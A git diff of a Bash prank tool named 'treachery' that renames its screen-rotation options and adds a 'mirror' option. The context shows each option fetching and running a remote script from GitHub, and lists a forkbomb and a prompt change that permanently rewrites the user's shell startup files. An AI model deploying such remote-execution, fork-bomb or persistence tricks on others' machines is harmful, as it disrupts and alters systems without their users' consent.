@@ -14,7 +14,7 @@ BASEURL="https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master"
 B="\033[1m"
 U="\033[4m"
 N="\033[0m"
-CHOICES="'list' 'help' '-h' 'shortlist' '-l' 'forked bom' 'forkbomb' 'gif' 'parrot' 'boykisser' 'prompt' 'brightness' 'rotate' 'flip' 'zoom'"
+CHOICES="'list' 'help' '-h' 'shortlist' '-l' 'forked bom' 'forkbomb' 'gif' 'parrot' 'boykisser' 'prompt' 'brightness' 'tilt' 'rotate' 'zoom' 'mirror'"
 # Main program
 echo -n 'Hello and welcome to this framework for treachery, built by the Goblin himself, for your execution pleasure. within you will find many "useful" options, available to you through just a few command-line arguments.'"\n\n"
 
@@ -42,8 +42,8 @@ treachery(){
 		'prompt' sets the users prompt to a much less intrusive version of the boykisser (1 line tall)
 			NB! is permanent, as it changes all* shell startup scripts, as well as .profile
 		'brightness' sets the gamma of the screen
-		'rotate' rotates the screen by a factor
-		'flip' rotates screen the 'regular' way
+		'tilt' tilt the screen by some factor
+		'rotate' rotates screen the 'regular' way
 			IE: how you would rotate your monitor
 		'zoom' zooms the screen in by a factor
 		'mirror' reflects the screen
@@ -84,12 +84,12 @@ treachery(){
 			echo "Brightness chosen"
 			webrun ${BASEURL}/assorted/brightne.sh
 			;;
-		"rotate")
-			echo "Rotate chosen"
+		"tilt")
+			echo "Tilt chosen"
 			webrun ${BASEURL}/assorted/rotate.sh
 			;;
-		"flip")
-			echo "Flip chosen"
+		"rotate")
+			echo "Rotate chosen"
 			webrun ${BASEURL}/assorted/screen.sh
 			;;
 		"zoom")
